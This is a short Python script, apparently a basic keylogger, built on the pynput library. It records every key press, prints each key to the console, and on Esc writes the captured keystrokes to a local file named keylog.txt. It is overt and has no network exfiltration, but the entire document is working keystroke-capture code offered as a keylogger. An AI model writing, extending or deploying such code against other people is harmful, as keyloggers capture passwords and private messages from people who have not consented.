from pynput.keyboard import Key, Listener

# Global variables to store keystrokes
log = []

def on_press(key):
    # Log the key press
    log.append(str(key))

    # Print the key for debugging purposes
    print(f"{key} pressed")

    # Example to stop the keylogger when 'esc' is pressed
    if key == Key.esc:
        write_to_file()
        return False

def write_to_file():
    with open("keylog.txt", "w") as f:
        for key in log:
            f.write(str(key) + "\n")

    print("Keystrokes saved to keylog.txt")

def main():
    print("Keylogger started. Press 'esc' to stop.")

    # Setup the listener
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
